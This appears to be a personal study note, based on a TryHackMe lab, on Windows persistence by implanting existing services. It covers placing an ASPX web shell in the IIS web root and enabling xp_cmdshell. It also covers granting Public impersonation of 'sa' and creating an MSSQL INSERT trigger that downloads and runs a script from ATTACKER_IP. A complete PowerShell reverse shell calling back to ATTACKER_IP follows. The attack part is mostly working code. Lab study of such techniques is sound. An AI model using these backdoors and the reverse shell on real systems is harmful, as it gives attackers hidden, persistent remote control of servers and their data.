
# Windows Persistence - Implant Existing Services

Target applications where you have some degree of control on what gets executed should be backdoorable similarly.

## Implanting Web Server Using Web Shells

`iis apppool\defaultapppool` even though it is not a administrators group member or equivalent has `SeImpersonatePrivilege`, which can easily escalatepost reverse shell call back. See [[SePrivilege-Token-Table]].

```powershell
#  place shell in web directory
move shell.aspx C:\inetpub\wwwroot\
```

[Link to a web shell recommended on THM](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx)

## MSSQL as Backdoor

There are many I will update this section as I research them or come across or are messsage about.

#### MSSQL Server Installation

This option uses [triggers](https://learn.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql?view=sql-server-ver16) in MSSQL which allow the binding of functionality to events that occur in the database. It requires requires the databases to be configured to enable `xp_cmdshell`, [disabled by default](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver16) and *"as a security best practice it is recommended to only enable it for the duration of the actual task that requires it."*

The [THM room](https://tryhackme.com/room/windowslocalpersistence) uses the  `Microsoft SQL Server Management Studio 18`,by default, the local Administrator account will have access to all DBs.

Click to `New Query`, then reconifgure the database to allow for `xp_cmdshell`:
```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```
By default only users with `sysadmin` (default administrator) role can run `xp_cmdshell`, so grant privilege to all users of the `sa` user. 
```sql
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];

USE HRDB
```

Create the trigger whenever `INSERT` is used against the database to then download:
```sql
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

[[Reverse-Shells-Listing]] for example in powershell

```powershell
# evilscript.ps1
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```


## References

[THM Windows Persistence Room](https://tryhackme.com/room/windowslocalpersistence)
[create trigger documentation](https://learn.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql?view=sql-server-ver16)
[xp_cmdshell documentatIon](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver16)